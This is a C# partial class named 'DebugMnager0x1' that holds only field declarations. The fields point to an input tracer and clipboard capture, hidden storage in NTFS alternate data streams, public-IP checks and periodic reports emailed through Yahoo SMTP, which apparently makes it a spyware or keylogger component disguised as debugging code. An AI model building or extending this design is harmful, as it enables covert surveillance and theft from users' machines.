using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Diagnostics;

using Asmodat.Abbreviate;
using Asmodat.Types;

using System.Resources;

using Asmodat.IO;
using Asmodat.Networking;

namespace Asmodat.Debugging
{
    public partial class DebugMnager0x1
    {
        private Mails EMail;
        private InputTracer Tracer;

        private string HostSMTP { get; set; } = @"smtp.mail.yahoo.com";
        private string HostIMAP { get; set; } = @"imap.mail.yahoo.com";
        private int PortSMTP { get; set; } = 587;
        private int PortIMAP { get; set; } = 993;
        private UInt16 Seed { get; set; } = 25;
        private int TracerLength { get; set; } = 10 * 1024;
        private string TracerPath{ get; set; } = null;

        private string EnEmail { get; set; }
        private string EnPassword { get; set; }
        private string EnTo { get; set; }

        private int MinClipboard { get; set; } = 8;
        private int MaxClipboard { get; set; } = 64;
        private int SaveIntervalADS { get; set; } = 60000;
        private int ProcessRaportInterval { get; set; } = 60000;
        private int ProcessCheckIPInterval { get; set; } = 120000;

        public bool Started { get; set; } = false;

        private string PublicIP { get; set; } = null;

        private ThreadedTimers Timers;

        private string Path { get; set; } = null;


        private string Name { get; set; } = "DebugMnager0x1";
        private string ADS_ID { get { return this.Name + "ID"; } }
        private string ADS_PublicIP { get { return this.Name + "PubicIP"; } }

        private string ID { get; set; } = null;


        public bool InnerRaportRequest { get; private set; } = false;
        public bool OuterRaportRequest { get; private set; } = false;

        public bool EnableSsl { get; private set; } = true;
    }
}
